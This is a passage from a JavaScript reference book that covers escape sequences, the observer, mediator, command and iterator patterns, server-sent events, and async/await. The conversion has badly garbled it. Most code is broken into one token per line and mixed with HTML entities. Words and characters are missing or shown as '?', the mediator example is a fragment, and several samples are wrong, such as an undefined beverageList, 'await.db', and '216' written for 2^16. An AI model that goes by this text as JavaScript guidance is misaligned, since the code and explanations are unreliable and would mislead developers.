sequences, as documented in the examples in this topic. For instance,
the following escape sequences all denote the same character: the
*line feed* (Unix newline character), with character code U+000A.

  
  &bsol;&bsol;&bsol;&bsol;u
  

  

&bsol;&bsol;&bsol;&bsol;n
>
&bsol;&bsol;&bsol;&bsol;x0a
>
&bsol;&bsol;&bsol;&bsol;u000a
>
{a} new in ES6, only in strings
>
&bsol;&bsol;&bsol;&bsol;012 forbidden in string literals in strict mode and in template
strings &bsol;&bsol;&bsol;&bsol;cj only in regular expressions

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 78.2: Escape sequence types
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

**Single character escape sequences**
>
Some escape sequences consist of a backslash followed by a single
character.

  
  alert             (   &quot;Hello**&bsol;&bsol;n**World&quot;
    

  

For example, in );, the escape sequence &bsol;&bsol;n is used to introduce a
newline in the string parameter, so that the words &quot;Hello&quot; and
&quot;World&quot; are displayed in consecutive lines.

  -
  **Escape sequence Character**                                  **Unicode**
   -
  &bsol;&bsol;b (only in strings, not in regular expressions) backspace    U+0008

  &bsol;&bsol;t horizontal tab                                             U+0009

  &bsol;&bsol;n line feed                                                  U+000A

  &bsol;&bsol;v vertical tab                                               U+000B

  &bsol;&bsol;f form feed                                                  U+000C
  -

&bsol;&bsol;r carriage return U+000D

Additionally, the sequence &bsol;&bsol;0, when not followed by a digit between 0
and 7, can be used to escape the null character (U+0000).
>
The sequences &bsol;&bsol;&bsol;&bsol;, &bsol;&amp;apos; and &bsol;&amp;quot; are used to escape the character
that follows the backslash. While similar to nonescape sequences,
where the leading backslash is simply ignored (i.e. &bsol;&bsol;? for ?), they
are explicitly treated as single character escape sequences inside
strings as per the specification.
>
**Hexadecimal escape sequences**
>
Characters with codes between 0 and 255 can be represented with an
escape sequence where &bsol;&bsol;x is followed by the 2-digit hexadecimal
character code. For example, the non-breaking space character has code
160 or A0 in base 16, and so it can be written as &bsol;&bsol;xa0. **var** str =
&quot;ONE**&bsol;&bsol;x**a0LINE&quot;; *// ONE and LINE with a non-breaking space
between them*
>
For hex digits above 9, the letters a to f are used, in lowercase or
uppercase without distinction.
>
**var** regExp1 = */&lbrack;&bsol;&bsol;x00-xff&rbrack;/*; *// matches any character between
U+0000 and U+00FF* **var** regExp2 = */&lbrack;&bsol;&bsol;x00-xFF&rbrack;/*; *// same as
above*
>
**4-digit Unicode escape sequences**
>
Characters with codes between 0 and 65535 (216 - 1) can be represented
with an escape sequence where &bsol;&bsol;u is followed by the 4-digit
hexadecimal character code.
>
For example, the Unicode standard defines the right arrow character
(&quot;?&quot;) with the number 8594, or 2192 in hexadecimal format. So an
escape sequence for it would be &bsol;&bsol;u2192.
>
This produces the string &quot;A ? B&quot;:

**var**

str

=

&quot;A

**&bsol;&bsol;u**

2192

B&quot;

;

For hex digits above 9, the letters a to f are used, in lowercase or
uppercase without distinction. Hexadecimal codes shorter than 4 digits
must be left-padded with zeros: &bsol;&bsol;u007A for the small letter &quot;z&quot;.
>
**Curly bracket Unicode escape sequences**

Version ≥ 6

ES6 extends Unicode support to the full code range from 0 to 0x10FFFF.
In order to escape characters with code greater than 216 - 1, a new
syntax for escape sequences was introduced:

&bsol;&bsol;u

{

???

}

Where the code in curly braces is hexadecimal representation of the
code point value, e.g.

alert

(

&quot;Look!

**&bsol;&bsol;u**

{1

f440}&quot;

)

;

*// Look! ????*

In the example above, the code 1f440 is the hexadecimal representation
of the character code of the Unicode Character *Eyes*.
>
Note that the code in curly braces may contain any number of hex
digits, as long the value does not exceed 0x10FFFF. For hex digits
above 9, the letters a to f are used, in lowercase or uppercase
without distinction.
>
Unicode escape sequences with curly braces only work inside strings,
not inside regular expressions!
>
**Octal escape sequences**
>
Octal escape sequences are deprecated as of ES5, but they are still
supported inside regular expressions and in non-strict mode also
inside non-template strings. An octal escape sequence consists of one,
two or three octal digits, with value between 0 and 3778 = 255.

  
  105
  

  

For example, the capital letter &quot;E&quot; has character code 69, or 105 in
base 8. So it can be represented with the escape sequence &bsol;&bsol;:

/

&bsol;&bsol;105scape

/

.

test

(

&quot;Fun with Escape Sequences&quot;

)

;

*// true*

In strict mode, octal escape sequences are not allowed inside strings
and will produce a syntax error. It is worth to note that &bsol;&bsol;0, unlike
&bsol;&bsol;00 or &bsol;&bsol;000, is *not* considered an octal escape sequence, and is
thus still allowed inside strings (even template strings) in strict
mode.
>
**Control escape sequences**
>
Some escape sequences are only recognized inside regular expression
literals (not in strings). These can be used to escape characters with
codes between 1 and 26 (U+0001U+001A). They consist of a single
letter AZ (case makes no difference) preceded by &bsol;&bsol;c. The alphabetic
position of the letter after &bsol;&bsol;c determines the character code.
>
For example, in the regular expression

&grave;

/

&bsol;&bsol;cG

/

&grave;

The letter &quot;G&quot; (the 7th letter in the alphabet) refers to the
character U+0007, and thus

&grave;

/

&bsol;&bsol;cG&grave;

/

.

test

(

String

.

fromCharCode

(

7

)

)

;

*// true*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 79: Behavioral Design Patterns
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 79.1: Observer pattern
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

The [Observer](https://en.wikipedia.org/wiki/Observer_pattern) pattern
is used for event handling and delegation. A *subject* maintains a
collection of *observers.* The subject then notifies these observers
whenever an event occurs. If you&apos;ve ever used
[addEventListener](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener)
then you&apos;ve utilized the Observer pattern.

**function**

Subject

(

)

{

**this**

.

observers

=

&lbrack;

&rbrack;

;

*// Observers listening to the subject*

**this**

.

registerObserver

=

**function**

(

observer

)

{

*// Add an observer if it isn&apos;t already being tracked*

**if**

(

**this**

.

observers

.

indexOf

(

observer

)

===

&minus;

1

)

{

**this**

.

observers

.

push

(

observer

)

;

}

}

;

**this**

.

unregisterObserver

=

**function**

(

observer

)

{

*// Removes a previously registered observer*

**var**

index

=

**this**

.

observers

.

indexOf

(

observer

)

;

**if**

(

index

&gt;

&minus;

1

)

{

**this**

.

observers

.

splice

(

index

,

1

)

;

}

}

;

**this**

.

notifyObservers

=

**function**

(

message

)

{

*// Send a message to all observers*

**this**

.

observers

.

forEach

(

**function**

(

observer

)

{

observer.

notify

(

message

)

;

}

)

;

}

;

}

**function**

Observer

(

)

{

**this**

.

notify

=

**function**

(

message

)

{

*// Every observer must implement this function*

}

;

}

**Example usage:**

**function**

Employee

(

name

)

{

**this**

.

name

=

name

;

*// Implement &grave;notify&grave; so the subject can pass us messages*

**this**

.

notify

=

**function**

(

meetingTime

)

{

console.

log

(

**this**

.

name

&plus;

&apos;: There is a meeting at &apos;

&plus;

meetingTime

)

;

}

;

}

**var**

bob

=

**new**

Employee

(

&apos;Bob&apos;

)

;

**var**

jane

=

**new**

Employee

(

&apos;Jane&apos;

)

;

**var**

meetingAlerts

=

**new**

Subject

(

)

;

meetingAlerts.

registerObserver

(

bob

)

;

meetingAlerts.

registerObserver

(

jane

)

;

meetingAlerts.

notifyObservers

(

&apos;4pm&apos;

)

;

*// Output:*

*// Bob: There is a meeting at 4pm*

*// Jane: There is a meeting at 4pm*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 79.2: Mediator Pattern
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

Think of the mediator pattern as the flight control tower that
controls planes in the air: it directs this plane to land now, the
second to wait, and the third to take off, etc. However no plane is
ever allowed to talk to its peers.
>
This is how mediator works, it works as a communication hub among
different modules, this way you reduce module dependency on each
other, increase loose coupling, and consequently portability.
>
This [**Chatroom
example**](http://www.dofactory.com/javascript/mediator-design-pattern)
explains how mediator patterns works:

![](./images/image041.png){width="7.486805555555556in"
height="8.206944444444444in"}

}

)

(

)

;

**function**

run

(

)

{

**var**

yoko

=

**new**

Participant

(

&quot;Yoko&quot;

)

;

**var**

john

=

**new**

Participant

(

&quot;John&quot;

)

;

**var**

paul

=

**new**

Participant

(

&quot;Paul&quot;

)

;

**var**

ringo

=

**new**

Participant

(

&quot;Ringo&quot;

)

;

**var**

chatroom

=

**new**

Chatroom

(

)

;

chatroom.

register

(

yoko

)

;

chatroom.

register

(

john

)

;

chatroom.

register

(

paul

)

;

chatroom.

register

(

ringo

)

;

yoko.

send

(

&quot;All you need is love.&quot;

)

;

yoko.

send

(

&quot;I love you John.&quot;

)

;

paul.

send

(

&quot;Ha, I heard that!&quot;

)

;

log.

show

(

)

;

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 79.3: Command
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

The command pattern encapsulates parameters to a method, current
object state, and which method to call. It is useful to
compartmentalize everything needed to call a method at a later time.
It can be used to issue a &quot;command&quot; and decide later which piece of
code to use to execute the command.
>
There are three components in this pattern:

1.  Command Message - the command itself, including the method name,
    parameters, and state

2.  Invoker - the part which instructs the command to execute its
    instructions. It can be a timed event, user interaction, a step in a
    process, callback, or any way needed to execute the command.

3.  Receiver - the target of the command execution.

**Command Message as an Array**
>
**var** aCommand = **new** Array(); aCommand.push(**new**
Instructions().DoThis); *//Method to execute* aCommand.push(&quot;String
Argument&quot;); *//string argument* aCommand.push(777); *//integer
argument* aCommand.push(**new** Object {} ); *//object argument*
aCommand.push(**new** Array() ); *//array argument*
>
Constructor for command class

class

DoThis

{

constructor

(

stringArg

,

numArg

,

objectArg

,

arrayArg

)

{

**this**

.&lowbar;stringArg

=

stringArg

;

**this**

.&lowbar;numArg

=

numArg

;

**this**

.&lowbar;objectArg

=

objectArg

;

**this**

.&lowbar;arrayArg

=

arrayArg

;

}

Execute

(

)

{

**var**

receiver

=

**new**

Instructions

(

)

;

receiver.

DoThis

(

**this**

.&lowbar;stringArg

,

**this**

.&lowbar;numArg

,

**this**

.&lowbar;objectArg

,

**this**

.&lowbar;arrayArg

)

;

}

}

**Invoker**

aCommand.

Execute

(

)

;

Can invoke:
>
immediately in response to an event in a sequence of execution as a
callback response or in a promise at the end of an event loop
>
in any other needed way to invoke a method
>
**Receiver**

class

Instructions

{

DoThis

(

stringArg

,

numArg

,

objectArg

,

arrayArg

)

{

console.

log

(

&grave;&dollar;

{

stringArg

}

,

&dollar;

{

numArg

}

,

&dollar;

{

objectArg

}

,

&dollar;

{

arrayArg

}

&grave;

)

;

}

}

A client generates a command, passes it to an invoker that either
executes it immediately or delays the command, and then the command
acts upon a receiver. The command pattern is very useful when used
with companion patterns to create messaging patterns.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 79.4: Iterator
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

An iterator pattern provides a simple method for selecting,
sequentially, the next item in a collection.
>
**Fixed Collection**

class

BeverageForPizza

{

constructor

(

preferenceRank

)

{

**this**

.

beverageList

=

beverageList

;

**this**

.

pointer

=

0

;

}

next

(

)

{

**return**

**this**

.

beverageList

&lbrack;

**this**

.

pointer

++

&rbrack;

;

}

**var**

withPepperoni

=

**new**

BeverageForPizza

(

&lbrack;

&quot;Cola&quot;

,

&quot;Water&quot;

,

&quot;Beer&quot;

&rbrack;

)

;

withPepperoni.

next

(

)

;

*//Cola*

withPepperoni.

next

(

)

;

*//Water*

withPepperoni.

next

(

)

;

*//Beer*

In ECMAScript 2015 iterators are a built-in as a method that returns
done and value. done is true when the iterator is at the end of the
collection

**function**

preferredBeverage

(

beverage

)

{

**if**

(

beverage

==

&quot;Beer&quot;

)

{

**return**

**true**

;

}

**else**

{

**return**

**false**

;

}

}

**var**

withPepperoni

=

**new**

BeverageForPizza

(

&lbrack;

&quot;Cola&quot;

,

&quot;Water&quot;

,

&quot;Beer&quot;

,

&quot;Orange Juice&quot;

&rbrack;

)

;

**for**

(

**var**

bevToOrder of withPepperoni

)

{

**if**

(

preferredBeverage

(

bevToOrder

)

{

bevToOrder.

done

;

*//false, because &quot;Beer&quot; isn&apos;t the final collection item*

**return**

bevToOrder

;

*//&quot;Beer&quot;*

}

}

**As a Generator**

class

FibonacciIterator

{

constructor

(

)

{

**this**

.

previous

=

1

;

**this**

.

beforePrevious

=

1

;

}

next

(

)

{

**var**

current

=

**this**

.

previous

&plus;

**this**

.

beforePrevious

;

**this**

.

beforePrevious

=

**this**

.

previous

;

**this**

.

previous

=

current

;

**return**

current

;

}

}

**var**

fib

=

**new**

FibonacciIterator

(

)

;

fib.

next

(

)

;

*//2*

fib.

next

(

)

;

*//3*

fib.

next

(

)

;

*//5*

In ECMAScript 2015

**function**

&ast;

FibonacciGenerator

(

)

{

*//asterisk informs javascript of generator*

**var**

previous

=

1

;

**var**

beforePrevious

=

1

;

while

(

**true**

)

{

**var**

current

=

previous

&plus;

beforePrevious

;

beforePrevious

=

previous

;

previous

=

current

;

yield current

;

*//This is like return but*

*//keeps the current state of the function*

*// i.e it remembers its place between calls*

}

}

**var**

fib

=

FibonacciGenerator

(

)

;

fib.

next

(

)

.

value

;

*//2*

fib.

next

(

)

.

value

;

*//3*

fib.

next

(

)

.

value

;

*//5*

fib.

next

(

)

.

done

;

*//false*

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
# Chapter 80: Server-sent events
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 80.1: Setting up a basic event stream to the server
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

You can setup your client browser to listen in incoming server events
using the EventSource object. You will need to supply the constructor
a string of the path to the server&apos; API endpoint the will subscribe
the client to the server events.
>
Example:

  
  **var** eventSource     =   **new** EventSource     (   &quot;api/my-events&quot;
      

  

);

  
  onmessage
  

  

Events have names with which they are categorized and sent, and a
listener must be setup to listen to each such event by name. the
default event name is message and in order to listen to it you must
use the appropriate event listener, .

evtSource.

onmessage

=

**function**

(

event

)

{

**var**

data

=

JSON.

parse

(

event.

data

)

;

*// do something with data*

}

  -
  text                         /       plain
   - 

  -

The above function will run every time the server will push an event
to the client. Data is sent as , if you send JSON data you may want to
parse it.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 80.2: Closing an event stream
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  EventSource.close
  

  

An event stream to the server can be closed using the () method

**var**

eventSource

=

**new**

EventSource

(

&quot;api/my-events&quot;

)

;

*// do things &hellip;*

eventSource.

close

(

)

;

*// you will not receive anymore events from this object*

  
  close
  

  

The .() method does nothing is the stream is already closed.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 80.3: Binding event listeners to EventSource
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

You can bind event listeners to the EventSource object to listen to
different events channels using the

  
  addEventListener
  

  

. method.

EventSource.addEventListener(name: String, callback: Function,
&lbrack;options&rbrack;)

**name**: The name related to the name of the channel the server is
emitting events to.
>
**callback**: The callback function runs every time an event bound to
the channel is emitted, the function provides the event as an
argument. **options**: Options that characterize the behavior of the
event listener.
>
The following example shows a heartbeat event stream from the server,
the server sends events on the heartbeat channel and this routine will
always run when an event in accepted.

**var**

eventSource

=

**new**

EventSource

(

&quot;api/heartbeat&quot;

)

;

&hellip;

eventSource

.

addEventListener

(

&quot;heartbeat&quot;

,

**function**

(

event

)

{

**var**

status

=

event.

data

;

**if**

(

status

==

&apos;OK&apos;

)

{

*// do something*

}

}

)

;

# Chapter 81: Async functions (async/await)

async and await build on top of promises and generators to express
asynchronous actions inline. This makes asynchronous or callback code
much easier to maintain.
>
Functions with the async keyword return a Promise, and can be called
with that syntax.

  
  async **function**
  

  

Inside an the await keyword can be applied to any Promise, and will
cause all of the function body after the await to be executed after
the promise resolves.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 81.1: Introduction
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

A function defined as async is a function that can perform
asynchronous actions but still look synchronous. The way it&apos;s done is
using the await keyword to defer the function while it waits for a
Promise to resolve or reject.
>
**Note:** Async functions are [a Stage 4 (&quot;Finished&quot;)
proposal](https://github.com/tc39/proposals/blob/master/finished-proposals.md)
on track to be included in the ECMAScript 2017 standard.
>
For instance, using the promise-based [Fetch
API](https://developer.mozilla.org/en/docs/Web/API/Fetch_API):

async

**function**

getJSON

(

url

)

{

**try**

{

**const**

response

=

await fetch

(

url

)

;

**return**

await response.

json

(

)

;

}

**catch**

(

err

)

{

*// Rejections in the promise will get thrown here*

console.

error

(

err.

message

)

;

}

}

An async function always returns a Promise itself, so you can use it
in other asynchronous functions.

**Arrow function style**

**const**

getJSON

=

async url

=&gt;

{

**const**

response

=

await fetch

(

url

)

;

**return**

await response.

json

(

)

;

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 81.2: Await and operator precedence
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

You have to keep the operator precedence in mind when using await
keyword.

  
  getUnicorn
  

  

  
  getSize
  

  

Imagine that we have an asynchronous function which calls another
asynchronous function, () which returns a Promise that resolves to an
instance of class Unicorn. Now we want to get the size of the unicorn
using the () method of that class.
>
Look at the following code:

async

**function**

myAsyncFunction

(

)

{

await getUnicorn

(

)

.

getSize

(

)

;

}

At first sight, it seems valid, but it&apos;s not. Due to operator
precedence, it&apos;s equivalent to the following:

async

**function**

myAsyncFunction

(

)

{

await

(

getUnicorn

(

)

.

getSize

(

)

)

;

}

  
  getSize
  

  

Here we attempt to call () method of the Promise object, which isn&apos;t
what we want.

  
  getSize
  

  

Instead, we should use brackets to denote that we first want to wait
for the unicorn, and then call () method of the result:

async

**function**

asyncFunction

(

)

{

(

await getUnicorn

(

)

)

.

getSize

(

)

;

}

  
  getUnicorn
  

  

  
  getSize
  

  

Of course. the previous version could be valid in some cases, for
example, if the () function was synchronous, but the () method was
asynchronous.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 81.3: Async functions compared to Promises
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

async functions do not replace the Promise type; they add language
keywords that make promises easier to call. They are interchangeable:

async

**function**

doAsyncThing

(

)

{

&hellip;

}

**function**

doPromiseThing

(

input

)

{

**return**

**new**

Promise

(

(

r

,

x

)

=&gt;

&hellip;

)

;

}

*// Call with promise syntax*

doAsyncThing

(

)

.

then

(

a

=&gt;

doPromiseThing

(

a

)

)

.

then

(

b

=&gt;

&hellip;

)

.

**catch**

(

ex

=&gt;

&hellip;

)

;

*// Call with await syntax*

**try**

{

**const**

a

=

await doAsyncThing

(

)

;

**const**

b

=

await doPromiseThing

(

a

)

;

&hellip;

}

**catch**

(

ex

)

{

&hellip;

}

Any function that uses chains of promises can be rewritten using
await:
>
**function** newUnicorn() { **return** fetch(&apos;unicorn.json&apos;) *//
fetch unicorn.json from server*
>
.then(responseCurrent =&bsol;responseCurrent.json()) *// parse the
response as JSON*
>
.then(unicorn =&bsol;fetch(&apos;new/unicorn&apos;, { *// send a request to
&apos;new/unicorn&apos;* method: &apos;post&apos;, *// using the POST method* body:
JSON.stringify({unicorn}) *// pass the unicorn to the request body*
>
})
>
)
>
.then(responseNew =&bsol;responseNew.json())
>
.then(json =&bsol;json.success) *// return success property of response*
>
.**catch**(err =&bsol;console.log(&apos;Error creating unicorn:&apos;, err));
>
}
>
The function can be rewritten using async / await as follows:
>
async **function** newUnicorn() { **try** {
>
**const** responseCurrent = await fetch(&apos;unicorn.json&apos;); *// fetch
unicorn.json from server* **const** unicorn = await
responseCurrent.json(); *// parse the response as JSON* **const**
responseNew = await fetch(&apos;new/unicorn&apos;, { *// send a request to
&apos;new/unicorn&apos;* method: &apos;post&apos;, *// using the POST method* body:
JSON.stringify({unicorn}) *// pass the unicorn to the request body*
>
}); **const** json = await responseNew.json(); **return** json.success
*// return success property of response*
>
} **catch** (err) { console.log(&apos;Error creating unicorn:&apos;, err); }
>
}

  
  newUnicorn
  

  

This async variant of () appears to return a Promise, but really there
were multiple await keywords. Each one returned a Promise, so really
we had a collection of promises rather than a chain.

  -
  **function**   &ast; generator, with each await being a   yield **new** Promise
    

  -

In fact we can think of it as a . However, the
>
results of each promise are needed by the next to continue the
function. This is why the additional keyword async is needed on the
function (as well as the await keyword when calling the promises) as
it tells JavaScript to

  
  async **function** newUnicorn
  

  

automatically creates an observer for this iteration. The Promise
returned by () resolves when this iteration completes.
>
Practically, you don&apos;t need to consider that; await hides the promise
and async hides the generator iteration.

  
  then
  

  

You can call async functions as if they were promises, and await any
promise or any async function. You don&apos;t need to await an async
function, just as you can execute a promise without a .().
>
You can also use an async
[IIFE](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression)
if you want to execute that code immediately:

(

async

(

)

=&gt;

{

await makeCoffee

(

)

console.

log

(

&apos;coffee is ready!&apos;

)

}

)

(

)

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 81.4: Looping with async await
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

When using async await in loops, you might encounter some of these
problems.
>
If you just try to use await inside forEach, this will throw an
Unexpected token error.

(

async

(

)

=&gt;

{

data

=

&lbrack;

1

,

2

,

3

,

4

,

5

&rbrack;

;

data.

forEach

(

e

=&gt;

{

**const**

i

=

await somePromiseFn

(

e

)

;

console.

log

(

i

)

;

}

)

;

}

)

(

)

;

This comes from the fact that you&apos;ve erroneously seen the arrow
function as a block. The await will be in the context of the callback
function, which is not async.
>
The interpreter protects us from making the above error, but if you
add async to the forEach callback no errors get thrown. You might
think this solves the problem, but it won&apos;t work as expected.
>
Example:
>
(async() =&bsol;{ data = &lbrack;1, 2, 3, 4, 5&rbrack;;

data.

forEach

(

async

(

e

)

=&gt;

{

**const**

i

=

await somePromiseFn

(

e

)

;

console.

log

(

i

)

;

}

)

;

console.

log

(

&apos;this will print first&apos;

)

;

}

)

(

)

;

This happens because the callback async function can only pause
itself, not the parent async function.

  -
  await asyncForEach   (   async   &lpar;e&rpar;   =&bsol;await somePromiseFn    (e),   data
    - -   

  -

You could write an asyncForEach function that returns a promise and
then you could something like
>
) Basically you return a promise that resolves when all the callbacks
are awaited and done. But there are better ways of doing this, and
that is to just use a loop.

  
  for       &minus;   of    loop or a                 **for**   /   while
    -    

  

You can use a loop, it doesn&apos;t really matter which one you pick.

(

async

(

)

=&gt;

{

data

=

&lbrack;

1

,

2

,

3

,

4

,

5

&rbrack;

;

**for**

(

**let**

e of data

)

{

**const**

i

=

await somePromiseFn

(

e

)

;

console.

log

(

i

)

;

}

console.

log

(

&apos;this will print last&apos;

)

;

}

)

(

)

;

But there&apos;s another catch. This solution will wait for each call to
somePromiseFn to complete before iterating over the next one.

  
  Promise.all
  

  

This is great if you actually want your somePromiseFn invocations to
be executed in order but if you want them to run concurrently, you
will need to await on .

(

async

(

)

=&gt;

{

data

=

&lbrack;

1

,

2

,

3

,

4

,

5

&rbrack;

;

**const**

p

=

await Promise.

all

(

data.

map

(

async

(

e

)

=&gt;

await somePromiseFn

(

e

)

)

)

;

console.

log

(

&hellip;

p

)

;

}

)

(

)

;

  
  Promise.all
  

  

receives an array of promises as its only parameter and returns a
promise. When all of the promises

in the array are resolved, the returned promise is also resolved. We
await on that promise and when it&apos;s resolved all our values are
available.

  
  stage
  

  

The above examples are fully runnable. The somePromiseFn function can
be made as an async echo function with a timeout. You can try out the
examples in the [babel-repl](https://babeljs.io/repl) with at least
the -3 preset and look at the output.

**function**

somePromiseFn

(

n

)

{

**return**

**new**

Promise

(

(

res

,

rej

)

=&gt;

{

setTimeout

(

(

)

=&gt;

res

(

n

)

,

250

)

;

}

)

;

}

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 81.5: Less indentation
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

With promises:
>
**function** doTheThing() { **return** doOneThing()

.

then

(

doAnother

)

.

then

(

doSomeMore

)

.

**catch**

(

handleErrors

)

}

With async functions:

async

**function**

doTheThing

(

)

{

**try**

{

**const**

one

=

await doOneThing

(

)

;

**const**

another

=

await doAnother

(

one

)

;

**return**

await doSomeMore

(

another

)

;

}

**catch**

(

err

)

{

handleErrors

(

err

)

;

}

}

  
  **try**                 /       **catch**
   - 

  

Note how the return is at the bottom, and not at the top, and you use
the language&apos;s native error-handling mechanics ().

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
## Section 81.6: Simultaneous async (parallel) operations
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->

  
  Promise.all
  

  

Often you will want to perform asynchronous operations in parallel.
There is direct syntax that supports this in the async/await proposal,
but since await will wait for a promise, you can wrap multiple
promises together in to wait for them:

*// Not in parallel*

async

**function**

getFriendPosts

(

user

)

{

friendIds

=

await db.

**get**

(

&quot;friends&quot;

,

{

user

}

,

{

id

:

1

}

)

;

friendPosts

=

&lbrack;

&rbrack;

;

**for**

(

**let**

id

**in**

friendIds

)

{

friendPosts

=

friendPosts.

concat

(

await db.

**get**

(

&quot;posts&quot;

,

{

user

:

id

}

)

)

;

}

*// etc.*

}

This will do each query to get each friend&apos;s posts serially, but they
can be done simultaneously:

*// In parallel*

async

**function**

getFriendPosts

(

user

)

{

friendIds

=

await.

db

.

**get**

(

&quot;friends&quot;

,

{

user

}

,

{

id

:

1

}

)

;

friendPosts

=

await Promise.

all

(

friendIds.

map

(

id

=&gt;

db.

**get**

(

&quot;posts&quot;

,

{

user

:

id

}

)

)

;

*// etc.*

}

  
  Promise.all
  

  

This will loop over the list of IDs to create an array of promises.
await will wait for *all* promises to be complete. combines them into
a single promise, but they are done in parallel.

# Chapter 82: Async Iterators

An async function is one that returns a promise. await yields to the
caller until the promise resolves and then continues with the result.

  
  for                                 &minus;          of
    

  

An iterator allows the collection to be looped through with a loop.

  
  for               &minus;    await                         &minus;    of
   -  - 

  

An async iterator is a collection where each iteration is a promise
which can be awaited using a loop.

  -
  &bsol;harmony                &minus;   async          &minus;   iteration
      

  -

Async iterators are a [stage 3
proposal](https://github.com/tc39/proposal-async-iteration). They are
